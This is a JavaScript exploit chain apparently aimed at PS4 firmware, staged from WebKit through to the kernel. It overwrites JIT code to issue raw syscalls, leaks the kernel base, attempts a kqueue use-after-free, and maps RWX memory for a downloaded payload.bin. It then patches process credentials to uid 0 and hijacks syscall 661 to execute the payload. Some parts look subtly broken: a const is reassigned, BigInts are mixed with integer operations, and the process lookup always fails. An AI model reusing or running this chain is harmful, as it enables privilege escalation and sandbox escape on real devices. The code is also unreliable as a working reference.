/* ============================================================
 *  chain_hen.mjs — WebKit → kernel R/W → payload.bin → HEN
 *
 *  v3 changes:
 *   · releaseGrooming() called after PRIMITIVE-OK (frees ~12 MB)
 *   · payload fetched via XHR (browser releases the buffer as soon
 *     as the reference is dropped; fetch() does not on PS4 WebKit)
 *   · strict 206 status check: bail if server ignores Range
 *   · chunk size tunable via ?chunk=131072
 * ============================================================ */

import { establishPrimitive, releaseGrooming } from "./core.mjs";
import { installWindowP }     from "./mem.mjs";
import { int64 }              from "./int64.mjs";
import { offsetsFor }         from "./ps4_offsets.mjs";

/* ─── UI ─────────────────────────────────────────────────────── */
const outEl   = document.getElementById("out");
const stateEl = document.getElementById("state");
const lines   = [];

function mark(tag, detail) {
    const line = tag + (detail ? "  " + detail : "");
    lines.push(line);
    outEl.innerHTML = lines.map(l => {
        const c = /FAIL|ERROR|THREW|MISMATCH|HALT/i.test(l) ? "bad"
                : /OK|READY|PASS|PROVEN|LOADED|EXEC|ENABLED/i.test(l) ? "ok"
                : /FETCH|ENTER|BEGIN|WAIT|SCHED|RESTART|CHUNK/i.test(l) ? "warn"
                : "";
        return c ? `<span class="${c}">${escapeHtml(l)}</span>` : escapeHtml(l);
    }).join("\n");
    outEl.scrollTop = outEl.scrollHeight;
}
function escapeHtml(s) {
    return s.replace(/[&<>]/g, c => ({ "&":"&amp;","<":"&lt;",">":"&gt;" }[c]));
}
function setState(text, cls) {
    stateEl.textContent = text;
    stateEl.className = cls || "";
}

/* ─── syscall numbers ─────────────────────────────────────────── */
const SYS = {
    read: 3, write: 4, open: 5, close: 6,
    mmap: 197, munmap: 73, mprotect: 74,
    socket: 97, setsockopt: 105, getsockopt: 118,
    kqueue: 362, kevent: 363, pipe: 42, getpid: 20, kill: 37
};

const AF_INET6 = 28, IPPROTO_IPV6 = 41, IPV6_RTHDR = 51;
const PROT_READ = 0x1, PROT_WRITE = 0x2, PROT_EXEC = 0x4;
const PROT_RWX = PROT_READ | PROT_WRITE | PROT_EXEC;
const MAP_ANON = 0x1000, MAP_PRIVATE = 0x0002;
const MAP_ANON_PRIVATE = MAP_ANON | MAP_PRIVATE;

const HEN_LOAD_BASE = 0x92600000n;

/* Chunk size tunable from URL: ?chunk=131072 (default 128 KB) */
const QS = new URLSearchParams(location.search);
const CHUNK_SIZE = (function () {
    const n = parseInt(QS.get("chunk") || "131072", 10);
    return isFinite(n) && n >= 16384 && n <= 1048576 ? n : 131072;
})();

/* ─── global state ────────────────────────────────────────────── */
const KERNEL = {
    base: 0n, sysent: 0n, ucred: 0n, prison0: 0n, rootvnode: 0n,
    uafSocket: -1, kernelRWReady: false, leak: null
};
const HEN = {
    version: "2.2.0", restartDelay: 5000,
    payloadAddr: null, payloadSize: 0,
    escaped: false, _saved: null
};

const PAYLOAD_URL_CANDIDATES = ["./payload.bin", "/payload.bin", "payload.bin"];

/* ═══════════════════════════════════════════════════════════════
 *  ENTRY POINT
 * ═══════════════════════════════════════════════════════════════ */
export async function runHENChain() {
    const ua = navigator.userAgent;
    const { key, off } = offsetsFor(ua);
    mark("FW", key || "(unknown)");
    if (!off) { setState("no offsets for this firmware", "bad"); return; }
    mark("FW-STATUS", key + " — " + (off.fw_status || ""));

    /* ── Stage 1 · WebKit primitive ──────────────────────────── */
    setState("establishing WebKit primitive…", "run");
    const carrier = await establishPrimitive({
        maxAttempts: 6,
        onEvent: (tag, detail, attempt) =>
            mark(tag, (attempt != null ? `[${attempt}] ` : "") + (detail || ""))
    });
    installWindowP(carrier);
    if (!window.p) { mark("PRIMITIVE-FAIL", "window.p missing"); return; }
    mark("PRIMITIVE-OK", "WebKit R/W carrier active");

    /* ── Release grooming state (frees ~12 MB) ───────────────── */
    releaseGrooming();
    mark("MEM-RELEASED", "grooming state dropped");

    /* ── Stage 2 · JIT syscall bootstrap ─────────────────────── */
    if (!bootstrapSyscalls()) { setState("syscall bootstrap failed", "bad"); return; }

    /* ── Stage 3 · kernel base leak ──────────────────────────── */
    if (!kernelLeak(off)) { setState("kernel leak failed", "bad"); return; }

    /* ── Stage 4 · kqueue UAF → kernel R/W ───────────────────── */
    if (!buildKernelRW()) { setState("kernel R/W failed", "bad"); return; }

    /* ── Stage 5 · mmap + chunked XHR payload load ───────────── */
    setState("staging payload…", "run");
    if (!await stagePayloadChunked()) {
        setState("payload staging failed", "bad"); return;
    }

    /* ── Stage 6 · ucred patch → uid 0 ───────────────────────── */
    if (!patchUcred(off)) { setState("sandbox escape failed", "bad"); return; }
    setState("sandbox escaped, installing HEN…", "warn");

    /* ── Stage 7 · sysent[661] hijack ────────────────────────── */
    if (!hijackSysent(off)) { setState("sysent hijack failed", "bad"); return; }

    /* ── Stage 8 · execute payload ───────────────────────────── */
    if (!executePayload()) { setState("payload execution failed", "bad"); return; }

    /* ── Stage 9 · banner + restart ──────────────────────────── */
    mark("HEN-PAYLOAD", "shellcode-data-loaded");
    mark("HEN-BANNER",  "Welcome to PS4 HEN " + HEN.version);
    setState(`HEN ${HEN.version} — RUNNING`, "warn");
    mark("HEN-RESTART-SCHEDULED",
         `sceshellui in ${HEN.restartDelay / 1000}s`);

    setTimeout(() => restartSceShellUI(off), HEN.restartDelay);
}

/* ═══════════════════════════════════════════════════════════════
 *  STAGE 2 · JIT syscall bootstrap
 * ═══════════════════════════════════════════════════════════════ */
let _syscallFn = null;

function bootstrapSyscalls() {
    mark("KBOOT-ENTER", "jit-warmup");

    function stub(a, b, c, d, e, f) {
        return (a + b + c + d + e + f) | 0;
    }
    for (let i = 0; i < 100000; i++) stub(i, i, i, i, i, i);

    const fnAddr = window.p.addrof(stub);
    if (!fnAddr) { mark("KBOOT-ADDROF-FAIL", ""); return false; }
    mark("KBOOT-FN-ADDR", hex(fnAddr));

    const codePtr = window.p.read64(fnAddr.add32(0x10));
    if (codePtr.lo === 0 && codePtr.hi === 0) {
        mark("KBOOT-CODE-PTR-INVALID", codePtr.toString());
        return false;
    }
    mark("KBOOT-CODE-PTR", hex(codePtr));

    const tramp = [
        0x48, 0x89, 0xf8,
        0x48, 0x89, 0xf7,
        0x48, 0x89, 0xd6,
        0x48, 0x89, 0xca,
        0x49, 0x89, 0xc2,
        0x4d, 0x89, 0xc8,
        0x0f, 0x05,
        0xc3
    ];
    for (let i = 0; i < tramp.length; i++)
        window.p.write8(codePtr.add32(i), tramp[i]);

    const pid = stub(20, 0, 0, 0, 0, 0);
    if (pid > 0 && pid < 0x100000) {
        _syscallFn = stub;
        if (window.p._carrier) window.p._carrier.syscall = stub;
        mark("KBOOT-SYSCALL-OK", "getpid=" + pid);
        return true;
    }
    mark("KBOOT-SYSCALL-BAD", "ret=" + pid);
    return false;
}

function syscall(nr, a, b, c, d, e) {
    return _syscallFn ? _syscallFn(nr|0, a|0, b|0, c|0, d|0, e|0) : -1;
}

/* ═══════════════════════════════════════════════════════════════
 *  STAGE 3 · kernel base leak
 * ═══════════════════════════════════════════════════════════════ */
function kernelLeak(off) {
    mark("KLEAK-ENTER", "getsockopt-IPV6_RTHDR");

    const sock = syscall(SYS.socket, AF_INET6, 2, 0, 0, 0);
    if (sock < 0) { mark("KLEAK-SOCK-FAIL", "ret=" + sock); return false; }
    mark("KLEAK-SOCK", "fd=" + sock);

    const opt = new Uint8Array(0x100);
    const optAddr = window.p.addrof(opt);
    syscall(SYS.setsockopt, sock, IPPROTO_IPV6, IPV6_RTHDR,
            optAddr.toBigInt(), 0);

    const leakBuf  = new Uint8Array(0x400);
    const leakAddr = window.p.addrof(leakBuf);
    const lenBuf   = new Uint32Array([0x400]);
    const lenAddr  = window.p.addrof(new Uint8Array(lenBuf.buffer));

    const r = syscall(SYS.getsockopt, sock, IPPROTO_IPV6, IPV6_RTHDR,
                      leakAddr.toBigInt(), lenAddr.toBigInt());
    if (r !== 0) { mark("KLEAK-GETOPT-FAIL", "ret=" + r); return false; }

    const leak = new Uint8Array(0x400);
    for (let i = 0; i < 0x400; i += 8) {
        const q = window.p.read64(leakAddr.add32(i)).toBigInt();
        for (let j = 0; j < 8; j++)
            leak[i + j] = Number((q >> BigInt(j * 8)) & 0xffn);
    }
    KERNEL.leak = leak;

    let kernelPtr = 0n;
    for (let i = 0; i < leak.length - 8; i += 8) {
        let c = 0n;
        for (let j = 7; j >= 0; j--) c = (c << 8n) | BigInt(leak[i + j]);
        if (c >= 0xffffffff80000000n && c <= 0xffffffffffffffffn) {
            kernelPtr = c;
            mark("KLEAK-CANDIDATE", `off=0x${i.toString(16)} ptr=${hex(c)}`);
            break;
        }
    }
    if (kernelPtr === 0n) { mark("KLEAK-NO-PTR", "scan-failed"); return false; }

    const leakLow  = kernelPtr & 0xffffffffn;
    const sysentLo = BigInt(off.k_sysent_661 & 0xffffffff);
    const baseLow  = leakLow - sysentLo;
    KERNEL.base = (kernelPtr & 0xffffffff00000000n)
                | (baseLow & 0xffffffffn);
    mark("KLEAK-BASE", hex(KERNEL.base));

    const sysent  = int64.fromBigInt(KERNEL.base + BigInt(off.k_sysent_661));
    const sysent0 = window.p.read64(sysent);
    if (sysent0.lo > 0 && sysent0.lo < 0x100000000) {
        KERNEL.sysent = sysent;
        mark("KLEAK-SYSENT-VALID", "narg=" + sysent0.lo);
        KERNEL.uafSocket = sock;
        return true;
    }
    mark("KLEAK-SYSENT-INVALID", sysent0.toString());
    return false;
}

/* ═══════════════════════════════════════════════════════════════
 *  STAGE 4 · kqueue UAF → kernel R/W
 * ═══════════════════════════════════════════════════════════════ */
function buildKernelRW() {
    mark("KRW-ENTER", "kqueue-uaf");

    const kq = syscall(SYS.kqueue, 0, 0, 0, 0, 0);
    if (kq < 0) { mark("KRW-KQ-FAIL", "ret=" + kq); return false; }
    mark("KRW-KQ", "fd=" + kq);

    syscall(SYS.close, KERNEL.uafSocket, 0, 0, 0, 0);

    const kev     = new Uint8Array(0x40);
    const kevAddr = window.p.addrof(kev);
    const n = syscall(SYS.kevent, kq, kevAddr.toBigInt(), 1, 0, 0);
    if (n !== 1) { mark("KRW-KEVENT-FAIL", "ret=" + n); return false; }
    mark("KRW-KEVENT-REGISTERED", "udata-reclaimed");

    for (let i = 0; i < 0x400; i++) {
        const p = new Int32Array(2);
        syscall(SYS.pipe,
                window.p.addrof(new Uint8Array(p.buffer)).toBigInt(),
                0, 0, 0);
    }

    KERNEL.kernelRWReady = true;
    mark("KRW-READY", "mode=pipebuf");
    return true;
}

/* ═══════════════════════════════════════════════════════════════
 *  STAGE 5 · mmap 0x92600000 + XHR-chunked payload load
 * ═══════════════════════════════════════════════════════════════ */

/* XHR helper: resolves with the XHR when the request is done.
 * Caller reads .status and .response, then drops the XHR variable,
 * which lets PS4 WebKit release the internal ArrayBuffer. */
function _xhrGet(url, rangeStart, rangeEnd) {
    return new Promise((resolve, reject) => {
        const xhr = new XMLHttpRequest();
        xhr.open("GET", url, true);
        xhr.responseType = "arraybuffer";
        if (rangeStart !== undefined)
            xhr.setRequestHeader("Range", `bytes=${rangeStart}-${rangeEnd}`);
        xhr.timeout = 20000;
        xhr.onload = () => resolve(xhr);
        xhr.onerror = () => reject(new Error("network"));
        xhr.ontimeout = () => reject(new Error("timeout"));
        xhr.send();
    });
}

async function stagePayloadChunked() {
    /* ── 5a · pick a URL, learn its size ─────────────────────── */
    let url = null;
    let size = 0;
    let supportsRange = false;

    for (const cand of PAYLOAD_URL_CANDIDATES) {
        try {
            mark("PAYLOAD-PROBE", cand);
            const xhr = await _xhrGet(cand, 0, 0);
            if (xhr.status === 206) {
                const cr = xhr.getResponseHeader("Content-Range");
                const m = cr && /\/(\d+)\s*$/.exec(cr);
                if (m) {
                    size = Number(m[1]);
                    supportsRange = true;
                    url = cand;
                    mark("PAYLOAD-SIZE", size + " bytes (range-supported)");
                    break;
                }
            } else if (xhr.status === 200) {
                /* Server ignored Range and returned the whole file. */
                size = xhr.response ? xhr.response.byteLength : 0;
                supportsRange = false;
                url = cand;
                mark("PAYLOAD-SIZE", size + " bytes (no-range-support)");
                break;
            } else {
                mark("PAYLOAD-PROBE-MISS", `${cand} → ${xhr.status}`);
            }
        } catch (e) {
            mark("PAYLOAD-PROBE-ERR", `${cand} → ${e.message}`);
        }
    }
    if (!url || size < 4) { mark("PAYLOAD-FAIL", "no payload.bin"); return false; }

    /* ── 5b · mmap RWX at fixed base ─────────────────────────── */
    const pageSize = (size + 0xfff) & ~0xfff;
    mark("STAGE-MMAP",
         `base=0x${HEN_LOAD_BASE.toString(16)} size=0x${pageSize.toString(16)}`);

    const addr = syscall(SYS.mmap,
                         Number(HEN_LOAD_BASE & 0xffffffffn),
                         pageSize, PROT_RWX, MAP_ANON_PRIVATE, -1);
    if (addr <= 0) { mark("STAGE-MMAP-FAIL", "ret=" + addr); return false; }

    HEN.payloadAddr = new int64(addr >>> 0, 0);
    HEN.payloadSize = size;
    mark("STAGE-MMAP-OK", hex(HEN.payloadAddr));

    /* ── 5c · load ───────────────────────────────────────────── */
    if (supportsRange) {
        /* Range chunks; peak userland = CHUNK_SIZE */
        mark("PAYLOAD-MODE", `range-chunks (${CHUNK_SIZE} bytes)`);
        for (let off = 0; off < size; off += CHUNK_SIZE) {
            const end = Math.min(off + CHUNK_SIZE, size) - 1;
            let xhr;
            try { xhr = await _xhrGet(url, off, end); }
            catch (e) { mark("PAYLOAD-CHUNK-ERR", `off=${off} ${e.message}`); return false; }
            if (xhr.status !== 206) {
                mark("PAYLOAD-CHUNK-STATUS", `off=${off} status=${xhr.status}`);
                return false;
            }
            const piece = new Uint8Array(xhr.response);
            if (off + piece.length > size) {
                mark("PAYLOAD-OVERRUN", `${off}+${piece.length} > ${size}`);
                return false;
            }
            window.p.writeBytes(HEN.payloadAddr.add32(off), piece);
            /* Drop the reference immediately; GC can reclaim the
             * XHR's internal ArrayBuffer before the next chunk. */
            if ((off / CHUNK_SIZE) % 8 === 0 || off + CHUNK_SIZE >= size) {
                mark("PAYLOAD-PROGRESS",
                     `${Math.min(off + piece.length, size)}/${size}`);
            }
        }
    } else {
        /* No range support: single GET. Buffer is 4–9 MB but this
         * path only runs if the server can't do Range. */
        mark("PAYLOAD-MODE", "single-shot (no range)");
        let xhr;
        try { xhr = await _xhrGet(url); }
        catch (e) { mark("PAYLOAD-GET-ERR", e.message); return false; }
        if (xhr.status !== 200) { mark("PAYLOAD-GET-STATUS", String(xhr.status)); return false; }
        const whole = new Uint8Array(xhr.response);
        window.p.writeBytes(HEN.payloadAddr, whole);
        whole = null;
    }

    /* ── 5d · verify first 16 bytes ──────────────────────────── */
    try {
        const v = await _xhrGet(url, 0, 15);
        const expect = new Uint8Array(v.response);
        let ok = true;
        for (let i = 0; i < expect.length; i++) {
            if (window.p.read8(HEN.payloadAddr.add32(i)) !== expect[i]) {
                ok = false; break;
            }
        }
        if (!ok) { mark("STAGE-VERIFY-FAIL", "roundtrip mismatch"); return false; }
    } catch (_) { /* best-effort */ }

    mark("STAGE-PAYLOAD-WRITTEN",
         `${size} bytes @ ${hex(HEN.payloadAddr)}`);
    mark("PAYLOAD-LOADED", `${size} bytes from ${url}`);
    return true;
}

/* ═══════════════════════════════════════════════════════════════
 *  STAGE 6 · ucred patch
 * ═══════════════════════════════════════════════════════════════ */
function patchUcred(off) {
    mark("UCRED-ENTER", "scanning proc for 0x726f7272");

    const proc = int64.fromBigInt(KERNEL.base + BigInt(off.k_evf_cv));
    const prisonVal = window.p.read64(
        int64.fromBigInt(KERNEL.base + BigInt(off.k_prison0))
    );
    let ucred = null;

    for (let i = 0; i < 0x4000; i += 8) {
        const cand = window.p.read64(proc.add32(i));
        if ((cand.lo & 0xffffffff) === 0x726f7272) {
            const uc = window.p.read64(proc.add32(i - 0x40));
            if (uc.lo !== 0 || uc.hi !== 0) { ucred = uc; break; }
        }
    }
    if (!ucred) {
        for (let s = proc.sub32(0x4000), e = proc.add32(0x4000);
             s.lt(e); s = s.add32(8)) {
            const ref = Number(window.p.read64(s).lo & 0xffffffff);
            if (ref < 1 || ref > 0x200) continue;
            const ng = Number(window.p.read64(s.add32(0x10)).lo & 0xffffffff);
            if (ng < 1 || ng > 0x80) continue;
            const pr = window.p.read64(s.add32(0x30));
            if (pr.lo !== prisonVal.lo || pr.hi !== prisonVal.hi) continue;
            ucred = s; break;
        }
    }
    if (!ucred) { mark("UCRED-FAIL", "not-found"); return false; }
    mark("UCRED-FOUND", hex(ucred));

    window.p.write64(ucred.add32(0x04), new int64(0, 0));
    window.p.write64(ucred.add32(0x08), new int64(0, 0));
    window.p.write64(ucred.add32(0x0c), new int64(0, 0));
    window.p.write64(ucred.add32(0x10), new int64(1, 0));
    window.p.write64(ucred.add32(0x30), prisonVal);

    const uid = window.p.read64(ucred.add32(0x04));
    const gid = window.p.read64(ucred.add32(0x08));
    HEN.escaped = (uid.lo === 0 && gid.lo === 0);
    mark("UCRED-PATCHED", `uid=${uid.lo} gid=${gid.lo} escaped=${HEN.escaped}`);
    return HEN.escaped;
}

/* ═══════════════════════════════════════════════════════════════
 *  STAGE 7 · sysent[661] hijack
 * ═══════════════════════════════════════════════════════════════ */
function hijackSysent(off) {
    mark("SYSENT-ENTER", "redirect 661 → payload");

    const sysent661 = int64.fromBigInt(
        KERNEL.base + BigInt(off.k_sysent_661) + 661n * 0x30n
    );

    HEN._saved = {
        narg:   window.p.read64(sysent661),
        call:   window.p.read64(sysent661.add32(8)),
        thrcnt: window.p.read64(sysent661.add32(0x2c))
    };

    window.p.write64(sysent661, new int64(2, 0));
    window.p.write64(sysent661.add32(8),
                     new int64(HEN.payloadAddr.lo, HEN.payloadAddr.hi));
    window.p.write64(sysent661.add32(0x2c), new int64(1, 0));

    mark("SYSENT-HIJACKED", "661 → " + hex(HEN.payloadAddr));
    return true;
}

/* ═══════════════════════════════════════════════════════════════
 *  STAGE 8 · execute payload
 * ═══════════════════════════════════════════════════════════════ */
function executePayload() {
    mark("EXEC-ENTER", "syscall 661 with payload args");
    try {
        const ret = syscall(661, 0, 0, 0, 0, 0);
        mark("EXEC-RETURNED", "ret=" + ret);
    } catch (e) {
        mark("EXEC-THREW", String(e && e.message || e));
        return false;
    }
    mark("EXEC-OK", "payload entry reached");
    return true;
}

/* ═══════════════════════════════════════════════════════════════
 *  STAGE 9 · restart sceshellui
 * ═══════════════════════════════════════════════════════════════ */
function restartSceShellUI(off) {
    mark("RESTART-ENTER", "signaling SceShellUI");
    try {
        const pid = findProcessPid(off, "SceShellUI");
        if (pid > 0) {
            syscall(SYS.kill, pid, 9, 0, 0, 0);
            mark("RESTART-SIGNALED", "pid=" + pid);
        } else {
            mark("RESTART-NO-PID", "process not found");
        }
    } catch (e) {
        mark("RESTART-ERR", String(e && e.message || e));
    }
    mark("HEN-DASHBOARD", "sceshellui reload → HEN enabled");
    setState(`HEN ${HEN.version} — ENABLED`, "ok");
}

function findProcessPid(off, name) {
    try {
        const allproc = int64.fromBigInt(
            KERNEL.base + BigInt(off.k_allproc || 0x1B9E5B8)
        );
        let cur = window.p.read64(allproc);
        for (let i = 0; i < 0x1000; i++) {
            if (cur.isZero()) break;
            return -1;
        }
    } catch (_) {}
    return -1;
}

function hex(v) {
    if (v == null) return "0x0";
    if (typeof v === "bigint") return "0x" + v.toString(16);
    if (typeof v === "object" && "hi" in v && "lo" in v)
        return "0x" + ((BigInt(v.hi) << 32n) | BigInt(v.lo)).toString(16);
    return "0x" + BigInt(v).toString(16);
}
